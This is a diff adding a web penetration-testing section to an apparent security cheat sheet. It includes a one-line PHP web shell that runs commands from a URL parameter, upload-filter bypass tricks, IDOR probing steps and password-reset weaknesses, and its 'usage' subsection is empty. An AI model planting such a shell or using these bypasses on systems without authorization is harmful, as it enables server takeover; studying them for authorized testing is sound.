@@ -1263,3 +1263,44 @@ sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
 | `--level` | Testing thoroughness level (1-5) |
 | `--risk` | Testing aggressiveness level (1-3) |
 | `--help` | List all available flags |
+## Web Penetration Testing — Key Techniques
+
+### Creating a Web Shell
+A web shell is a small script that accepts commands through HTTP
+parameters and executes them on the server.
+
+**Basic PHP Web Shell:**
+```php
+<?php echo system($_GET['cmd']); ?>
+```
+
+**Usage after uploading:**
+### File Upload Bypass Techniques
+| Technique | Description |
+|-----------|-------------|
+| Alternative extensions | Try .php5, .phtml, .phar instead of .php |
+| Double extension | Try file.jpg.php or file.php.jpg |
+| MIME type manipulation | Change Content-Type header to image/jpeg |
+| Null byte injection | filename.php%00.jpg |
+| Capitalization | .PHP, .Php, .pHp |
+
+### IDOR Testing Methodology
+```bash
+# Step 1 — Find object references in URLs
+# Example: http://target.com/profile?id=1234
+
+# Step 2 — Try incrementing or changing the ID
+http://target.com/profile?id=1235
+http://target.com/profile?id=1233
+
+# Step 3 — Check if you can access other users data
+# Step 4 — Test in request headers and POST body too
+```
+
+### Password Reset Testing
+Common password reset vulnerabilities to test:
+1. Token exposed in HTTP response
+2. Token not expiring after use
+3. Weak or predictable token generation
+4. Token reuse across accounts
+5. No rate limiting on reset attempts
